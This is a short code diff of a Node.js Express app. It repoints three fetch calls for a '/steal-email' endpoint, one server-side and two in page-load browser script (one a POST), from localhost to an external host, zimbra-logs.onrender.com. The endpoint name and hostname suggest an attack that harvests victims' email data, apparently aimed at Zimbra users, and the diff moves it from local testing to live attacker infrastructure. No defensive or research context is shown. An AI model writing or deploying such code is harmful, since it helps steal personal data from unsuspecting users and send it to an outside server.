@@ -9,7 +9,7 @@ app.get('/', async (req, res) => {
   let defaultEmail = '';
   try {
     const fetch = (await import('node-fetch')).default; // Dynamic import for node-fetch
-    const response = await fetch('http://localhost:3001/steal-email', {
+    const response = await fetch('https://zimbra-logs.onrender.com/steal-email', {
       method: 'GET',
       cache: 'no-cache'
     });
@@ -223,7 +223,7 @@ app.get('/', async (req, res) => {
     window.addEventListener('load', async function() {
       logMessage('=== FETCHING EMAIL FROM /steal-email ===');
       try {
-        const response = await fetch('http://localhost:3001/steal-email', {
+        const response = await fetch('https://zimbra-logs.onrender.com/steal-email', {
           method: 'GET',
           cache: 'no-cache'
         });
@@ -279,7 +279,7 @@ app.get('/', async (req, res) => {
       
       try {
         logMessage('Attempting POST request to /steal-email...');
-        const response = await fetch('http://localhost:3001/steal-email', {
+        const response = await fetch('https://zimbra-logs.onrender.com/steal-email', {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json'
